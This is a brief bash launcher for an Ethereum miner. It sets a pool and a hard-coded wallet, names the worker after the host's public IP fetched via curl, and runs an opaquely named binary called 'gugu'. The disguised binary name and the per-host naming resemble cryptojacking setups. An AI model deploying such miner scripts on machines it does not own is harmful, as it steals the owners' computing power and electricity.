#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=eu1.ethermine.org:14444
WALLET=0x23c43e95c038dc143d142857ee18f683a39934b8.$(echo "$(curl -s ifconfig.me)" | tr . _ )-asi

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

chmod +x gugu && ./gugu --algo ETHASH --pool $POOL --user $WALLET  --ethstratum ETHPROXY $@
